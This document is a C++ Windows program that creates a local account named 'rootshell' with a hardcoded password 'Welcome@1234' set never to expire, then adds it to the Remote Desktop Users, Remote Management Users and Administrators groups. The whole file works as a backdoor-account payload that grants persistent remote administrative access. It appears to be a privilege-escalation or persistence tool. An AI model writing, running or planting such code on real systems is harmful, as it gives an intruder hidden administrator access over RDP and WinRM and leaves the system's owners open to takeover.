#include <windows.h>
#include <lm.h>
#include <iostream>

#pragma comment(lib, "netapi32.lib")

int main() {
    USER_INFO_1 userInfo;
    LOCALGROUP_MEMBERS_INFO_3 groupInfo;
    NET_API_STATUS nStatus;

    // Step 1: Define the username and password
    const wchar_t* username = L"rootshell";
    const wchar_t* password = L"Welcome@1234";

    // Step 2: Print the username and password
    std::wcout << L"Creating user with the following credentials:" << std::endl;
    std::wcout << L"Username: " << username << std::endl;
    std::wcout << L"Password: " << password << std::endl;

    // Step 3: Set up USER_INFO_1 structure
    userInfo.usri1_name = const_cast<wchar_t*>(username);
    userInfo.usri1_password = const_cast<wchar_t*>(password);
    userInfo.usri1_priv = USER_PRIV_USER;
    userInfo.usri1_home_dir = NULL;
    userInfo.usri1_comment = NULL;
    userInfo.usri1_flags = UF_SCRIPT | UF_DONT_EXPIRE_PASSWD;
    userInfo.usri1_script_path = NULL;

    // Step 4: Add the user
    nStatus = NetUserAdd(NULL, 1, (LPBYTE)&userInfo, NULL);

    if (nStatus == NERR_Success) {
        std::wcout << L"User " << username << L" has been successfully created." << std::endl;

        // Prepare group info
        groupInfo.lgrmi3_domainandname = const_cast<wchar_t*>(username);

        // Step 5: Add the user to the "Remote Desktop Users" group
        nStatus = NetLocalGroupAddMembers(NULL, L"Remote Desktop Users", 3, (LPBYTE)&groupInfo, 1);

        if (nStatus == NERR_Success) {
            std::wcout << L"User " << username << L" added to Remote Desktop Users group." << std::endl;
        }
        else {
            std::wcerr << L"Failed to add user to Remote Desktop Users group. Error: " << nStatus << std::endl;
        }

        // Step 6: Add the user to the "Remote Management Users" (WinRM) group
        nStatus = NetLocalGroupAddMembers(NULL, L"Remote Management Users", 3, (LPBYTE)&groupInfo, 1);

        if (nStatus == NERR_Success) {
            std::wcout << L"User " << username << L" added to Remote Management Users group." << std::endl;
        }
        else {
            std::wcerr << L"Failed to add user to Remote Management Users group. Error: " << nStatus << std::endl;
        }

        // Step 7: Add the user to the "Administrators" group
        nStatus = NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&groupInfo, 1);

        if (nStatus == NERR_Success) {
            std::wcout << L"User " << username << L" added to Administrators group." << std::endl;
        }
        else {
            std::wcerr << L"Failed to add user to Administrators group. Error: " << nStatus << std::endl;
        }
    }
    else {
        std::wcerr << L"Failed to create user. Error: " << nStatus << std::endl;
    }

    return 0;
}
